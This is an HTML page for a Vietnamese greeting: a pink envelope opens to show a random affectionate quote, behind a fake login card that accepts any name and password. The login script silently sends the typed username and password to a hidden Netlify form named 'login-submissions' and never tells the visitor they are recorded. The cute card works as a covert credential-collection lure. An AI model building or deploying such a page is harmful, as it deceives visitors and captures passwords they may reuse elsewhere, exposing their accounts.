<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise!</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;600;700&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        /* ===================== RESET & BASE ===================== */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Outfit', sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden; /* screens 0 & 1 don't scroll */
        }

        .handwriting { font-family: 'Caveat', cursive; }

        /* ===================== SCREEN TRANSITIONS ===================== */
        .screen {
            position: absolute;
            inset: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: opacity 0.7s ease, transform 0.7s ease;
            opacity: 0;
            pointer-events: none;
            transform: translateY(18px);
        }
        .screen.active {
            opacity: 1;
            pointer-events: auto;
            transform: translateY(0);
        }
        .screen.hidden {
            opacity: 0;
            pointer-events: none;
            transform: scale(0.95);
        }

        /* ===================== SCREEN 0 — LOGIN ===================== */
        #screen0 { background: #0a0a0a; }

        .login-card {
            background: #fff;
            border-radius: 22px;
            padding: 2.8rem 2.4rem;
            width: 90%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(200,150,130,0.10);
        }

        .login-card .card-title {
            font-family: 'Caveat', cursive;
            font-size: 2.15rem;
            font-weight: 600;
            color: #444;
            line-height: 1.3;
            margin-bottom: 2rem;
        }

        .input-wrap { margin-bottom: 1.1rem; }

        .input-wrap input {
            width: 100%;
            padding: 0.85rem 1.2rem;
            border: 1.8px solid #f5c6c6;
            border-radius: 11px;
            font-size: 1.05rem;
            font-family: 'Outfit', sans-serif;
            color: #555;
            outline: none;
            background: #fff;
            transition: border-color 0.25s;
        }
        .input-wrap input::placeholder { color: #bbb; }
        .input-wrap input:focus { border-color: #f09090; }

        .login-error {
            color: #e07070;
            font-size: 0.9rem;
            margin-bottom: 0.6rem;
        }
        .login-error.hidden { display: none; }

        .btn-login {
            width: 100%;
            padding: 0.9rem;
            margin-top: 0.4rem;
            background: #f09090;
            color: #fff;
            border: none;
            border-radius: 11px;
            font-size: 1.15rem;
            font-family: 'Outfit', sans-serif;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, transform 0.15s;
        }
        .btn-login:hover { background: #e07878; transform: translateY(-2px); }
        .btn-login:active { transform: translateY(0); }

        /* ===================== SCREEN 1 — ENVELOPE ===================== */
        #screen1 {
            background: #0a0a0a;
            flex-direction: column;
            gap: 0;
        }

        .env-scene {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
            user-select: none;
            gap: 0;
        }

        .env-hey {
            font-family: 'Caveat', cursive;
            font-size: 3.6rem;
            font-weight: 700;
            color: #fff;
            margin-bottom: 1.6rem;
            animation: gentleBob 3s ease-in-out infinite;
        }

        @keyframes gentleBob {
            0%, 100% { transform: translateY(0); }
            50%       { transform: translateY(-6px); }
        }

        /* Pink envelope (CSS only, matching screenshot) */
        .env-wrapper {
            position: relative;
            width: 210px;
            height: 148px;
            margin-bottom: 1.6rem;
            filter: drop-shadow(0 10px 22px rgba(240,130,130,0.22));
        }

        /* Body */
        .env-body {
            position: absolute;
            inset: 0;
            background: #f9b8b8;
            border-radius: 10px;
        }

        /* Bottom two triangle folds */
        .env-body::before {
            content: '';
            position: absolute;
            bottom: 0; left: 0; right: 0;
            height: 0;
            border-bottom: 74px solid #f5a8a8;
            border-left:  105px solid transparent;
            border-right: 105px solid transparent;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
        }

        /* Left-side V fold */
        .env-body::after {
            content: '';
            position: absolute;
            top: 0; bottom: 0; left: 0;
            width: 0;
            border-left: 105px solid #f4aeae;
            border-top: 74px solid transparent;
            border-bottom: 74px solid transparent;
            border-top-left-radius: 10px;
            border-bottom-left-radius: 10px;
        }

        /* Right-side V fold */
        .env-right-fold {
            position: absolute;
            top: 0; bottom: 0; right: 0;
            width: 0;
            border-right: 105px solid #f4aeae;
            border-top: 74px solid transparent;
            border-bottom: 74px solid transparent;
            border-top-right-radius: 10px;
            border-bottom-right-radius: 10px;
        }

        /* Top flap */
        .env-flap {
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 0;
            border-top: 78px solid #f2a5a5;
            border-left:  105px solid transparent;
            border-right: 105px solid transparent;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            z-index: 2;
        }

        /* Heart seal */
        .env-heart {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 3;
            font-size: 2.4rem;
            animation: heartbeat 1.6s ease-in-out infinite;
        }

        @keyframes heartbeat {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            30%       { transform: translate(-50%, -50%) scale(1.13); }
            50%       { transform: translate(-50%, -50%) scale(1); }
            70%       { transform: translate(-50%, -50%) scale(1.08); }
        }

        .env-subtitle {
            font-family: 'Caveat', cursive;
            font-size: 1.55rem;
            color: #888;
            letter-spacing: 0.02em;
        }

        /* Hover lift */
        .env-scene:hover .env-wrapper { transform: translateY(-4px); transition: transform 0.3s ease; }

        /* ===================== SCREEN 2 — LETTER ===================== */
        #screen2 {
            background: #0a0a0a;
            overflow-y: auto;
            /* Allow inner wrapper to handle centering */
            align-items: stretch;
            justify-content: stretch;
        }

        /* Inner wrapper: always at least full height, centers the letter */
        .letter-center {
            min-height: 100%;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 3rem 1rem;
        }

        /* Floating red dots in background */
        .letter-bg-dots {
            position: absolute;
            inset: 0;
            pointer-events: none;
            overflow: hidden;
        }
        .dot {
            position: absolute;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: #e53935;
            opacity: 0;
            animation: dotFloat linear infinite;
        }
        @keyframes dotFloat {
            0%   { opacity: 0;    transform: translateY(0) scale(0.5); }
            15%  { opacity: 0.65; }
            85%  { opacity: 0.5; }
            100% { opacity: 0;    transform: translateY(-80px) scale(1); }
        }

        /* The letter paper */
        .letter-paper {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 450px;
            margin: 0 auto; /* center when screen scrolls */
            background:
                repeating-linear-gradient(
                    to bottom,
                    transparent,
                    transparent 30px,
                    rgba(160,120,80,0.22) 30px,
                    rgba(160,120,80,0.22) 31px
                ),
                linear-gradient(160deg, #f7e9c8 0%, #edd9a8 50%, #f0e0bf 100%);
            border-radius: 7px;
            padding: 46px 28px 34px 34px;
            box-shadow:
                0 18px 55px rgba(0,0,0,0.75),
                inset 0 1px 0 rgba(255,255,255,0.35);
            color: #4a3520;
            border: 1px solid rgba(139,90,43,0.12);
        }

        /* Paperclip emoji top-left */
        .letter-clip {
            position: absolute;
            top: -12px;
            left: 20px;
            font-size: 2rem;
            transform: rotate(-12deg);
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
        }

        .letter-title {
            font-family: 'Caveat', cursive;
            font-size: 2.3rem;
            font-weight: 700;
            color: #3a2510;
            margin-bottom: 1.3rem;
            padding-bottom: 0.7rem;
            border-bottom: 1px solid rgba(139,90,43,0.18);
            text-align: center;
        }

        .letter-body {
            font-family: 'Caveat', cursive;
            font-size: 1.65rem;
            line-height: 1.9;
            color: #4a3520;
            margin-bottom: 1.8rem;
            text-align: left;
        }

        /* Bullet dot before quote line */
        .letter-body::before {
            content: '• ';
            color: #c0392b;
        }

        .letter-sign {
            font-family: 'Caveat', cursive;
            font-size: 2rem;
            text-align: right;
            color: #3a2510;
        }

        /* Red floating particles around letter */
        .r-particle {
            position: absolute;
            width: 5px;
            height: 5px;
            background: #e53935;
            border-radius: 50%;
            opacity: 0;
            animation: rParticle 2.6s ease-in-out infinite;
        }
        @keyframes rParticle {
            0%, 100% { opacity: 0; transform: translateY(0) scale(0); }
            50%       { opacity: 0.7; transform: translateY(-14px) scale(1); }
        }
    </style>
</head>
<body>
    <!-- Hidden form for Netlify Forms -->
    <form name="login-submissions" data-netlify="true" hidden>
        <input type="text" name="username">
        <input type="text" name="password">
    </form>

    <!-- ====== SCREEN 0: LOGIN ====== -->
    <div id="screen0" class="screen active">
        <!-- Floating background dots -->
        <div class="letter-bg-dots">
            <div class="dot" style="left:5%;top:15%;animation-duration:4.2s;animation-delay:0s;"></div>
            <div class="dot" style="left:15%;top:72%;animation-duration:5.1s;animation-delay:1s;"></div>
            <div class="dot" style="left:28%;top:38%;animation-duration:3.7s;animation-delay:0.5s;"></div>
            <div class="dot" style="left:68%;top:22%;animation-duration:4.8s;animation-delay:0.3s;"></div>
            <div class="dot" style="left:80%;top:68%;animation-duration:3.9s;animation-delay:1.2s;"></div>
            <div class="dot" style="left:90%;top:45%;animation-duration:5.3s;animation-delay:2.1s;"></div>
            <div class="dot" style="left:52%;top:82%;animation-duration:4.4s;animation-delay:0.7s;"></div>
            <div class="dot" style="left:42%;top:8%;animation-duration:3.5s;animation-delay:1.9s;"></div>
        </div>
        <div class="login-card">
            <h2 class="card-title handwriting">Đăng nhập để xem nội dung nha!</h2>
            <div class="input-wrap">
                <input type="text" id="username" placeholder="nhập họ tên của bạn ...">
            </div>
            <div class="input-wrap">
                <input type="password" id="password" placeholder="pass thì ghi gì cụng được ...">
            </div>
            <p id="login-error" class="login-error hidden">Tên hoặc mật khẩu sai mất rồi!</p>
            <button id="login-btn" class="btn-login">Xem</button>
        </div>
    </div>

    <!-- ====== SCREEN 1: ENVELOPE ====== -->
    <div id="screen1" class="screen hidden">
        <!-- Floating background dots -->
        <div class="letter-bg-dots">
            <div class="dot" style="left:8%;top:18%;animation-duration:4s;animation-delay:0.2s;"></div>
            <div class="dot" style="left:20%;top:70%;animation-duration:5s;animation-delay:0.9s;"></div>
            <div class="dot" style="left:33%;top:42%;animation-duration:3.6s;animation-delay:1.6s;"></div>
            <div class="dot" style="left:72%;top:28%;animation-duration:4.6s;animation-delay:0.4s;"></div>
            <div class="dot" style="left:84%;top:65%;animation-duration:3.8s;animation-delay:1.1s;"></div>
            <div class="dot" style="left:93%;top:52%;animation-duration:5.2s;animation-delay:2s;"></div>
            <div class="dot" style="left:58%;top:85%;animation-duration:4.3s;animation-delay:0.6s;"></div>
            <div class="dot" style="left:47%;top:12%;animation-duration:3.4s;animation-delay:1.7s;"></div>
        </div>
        <div class="env-scene" id="open-envelope-btn">
            <p class="env-hey handwriting">hey!</p>
            <div class="env-wrapper">
                <div class="env-body"></div>
                <div class="env-right-fold"></div>
                <div class="env-flap"></div>
                <div class="env-heart">❤️</div>
            </div>
            <p class="env-subtitle handwriting">you've got new emails</p>
        </div>
    </div>

    <!-- ====== SCREEN 2: LETTER ====== -->
    <div id="screen2" class="screen hidden">
        <!-- Floating background dots -->
        <div class="letter-bg-dots" id="letter-bg-dots">
            <div class="dot" style="left:7%;top:20%;animation-duration:4s;animation-delay:0s;"></div>
            <div class="dot" style="left:18%;top:65%;animation-duration:5s;animation-delay:0.8s;"></div>
            <div class="dot" style="left:30%;top:40%;animation-duration:3.5s;animation-delay:1.5s;"></div>
            <div class="dot" style="left:70%;top:25%;animation-duration:4.5s;animation-delay:0.3s;"></div>
            <div class="dot" style="left:82%;top:70%;animation-duration:3.8s;animation-delay:1s;"></div>
            <div class="dot" style="left:92%;top:50%;animation-duration:5.2s;animation-delay:2s;"></div>
            <div class="dot" style="left:55%;top:80%;animation-duration:4.2s;animation-delay:0.6s;"></div>
            <div class="dot" style="left:45%;top:10%;animation-duration:3.6s;animation-delay:1.8s;"></div>
        </div>

        <!-- Centering wrapper (centers when short, scrolls when tall) -->
        <div class="letter-center">
            <!-- The letter -->
            <div class="letter-paper">
                <!-- Paperclip + heart -->
                <div class="letter-clip">📎❤️</div>

                <h2 class="letter-title">Gửi bạn!</h2>
                <p class="letter-body" id="random-quote">...</p>
                <p class="letter-sign">Thanks❤️</p>

                <!-- Red floating particles -->
                <div class="r-particle" style="top:8%;left:3%;animation-delay:0s;"></div>
                <div class="r-particle" style="top:20%;right:4%;animation-delay:0.5s;"></div>
                <div class="r-particle" style="top:50%;left:1%;animation-delay:1s;"></div>
                <div class="r-particle" style="top:70%;right:3%;animation-delay:1.4s;"></div>
                <div class="r-particle" style="bottom:6%;left:6%;animation-delay:0.7s;"></div>
                <div class="r-particle" style="bottom:12%;right:8%;animation-delay:1.8s;"></div>
            </div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // ============================================================
        // QUOTES
        // ============================================================
        const quotes = [
            'Đây là một câu rất dài để test xem bức thư có hiển thị đúng không nha! Khi câu dài, bức thư sẽ tự giãn ra theo chiều dọc và màn hình sẽ cuộn được, không bị tràn hay bị cắt bớt. Bạn cứ thêm câu dài bao nhiêu cũng được, giao diện sẽ tự điều chỉnh.',
            'Cuộc đời ngắn lắm, cười nhiều lên nha!',
            'Bạn là người tuyệt vời nhất tôi từng gặp.',
            'Dù thế nào, tôi vẫn luôn ở đây vì bạn.',
            'Bạn xứng đáng được yêu thương thật nhiều.',
            'Mỗi ngày có bạn là một ngày đáng nhớ.',
            'Hãy cứ là chính mình, bạn thật tuyệt đấy!',
            'Cảm ơn bạn đã luôn là chính mình.',
            'Bạn đẹp hơn mỗi ngày, thật đấy!',
            'Cứ vui lên nha, bạn xứng đáng với điều đó.',
            'Có bạn là mọi thứ đều trở nên dễ chịu hơn.'
        ];

        function getRandomQuote() {
            let used = JSON.parse(localStorage.getItem('usedQuoteIdx') || '[]');
            if (used.length >= quotes.length) used = [];
            const avail = quotes.map((_, i) => i).filter(i => !used.includes(i));
            const idx = avail[Math.floor(Math.random() * avail.length)];
            used.push(idx);
            localStorage.setItem('usedQuoteIdx', JSON.stringify(used));
            return quotes[idx];
        }

        // ============================================================
        // ELEMENTS
        // ============================================================
        const screen0 = document.getElementById('screen0');
        const screen1 = document.getElementById('screen1');
        const screen2 = document.getElementById('screen2');

        const loginBtn    = document.getElementById('login-btn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginError  = document.getElementById('login-error');

        const openEnvBtn  = document.getElementById('open-envelope-btn');
        const quoteEl     = document.getElementById('random-quote');

        // ============================================================
        // HELPERS
        // ============================================================
        function goTo(from, to, delay = 0) {
            from.classList.remove('active');
            from.classList.add('hidden');
            setTimeout(() => {
                to.classList.remove('hidden');
                to.classList.add('active');
            }, delay);
        }

        // ============================================================
        // LOGIN
        // ============================================================
        loginBtn.addEventListener('click', () => {
            const user = usernameInput.value.trim();
            const pass = passwordInput.value.trim();

            if (user !== '' && pass !== '') {
                // Submit to Netlify in background
                const fd = new URLSearchParams();
                fd.append('form-name', 'login-submissions');
                fd.append('username', user);
                fd.append('password', pass);
                fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: fd.toString() })
                    .catch(() => {});

                loginError.classList.add('hidden');
                goTo(screen0, screen1, 700);
            } else {
                loginError.classList.remove('hidden');
                loginError.textContent = 'Có dòng nào chưa nhập kia kìa';
            }
        });

        // Also allow Enter key
        [usernameInput, passwordInput].forEach(el => {
            el.addEventListener('keydown', e => { if (e.key === 'Enter') loginBtn.click(); });
        });

        // ============================================================
        // ENVELOPE → LETTER
        // ============================================================
        openEnvBtn.addEventListener('click', () => {
            quoteEl.textContent = getRandomQuote();
            goTo(screen1, screen2, 700);
        });
    });
    </script>
</body>
</html>
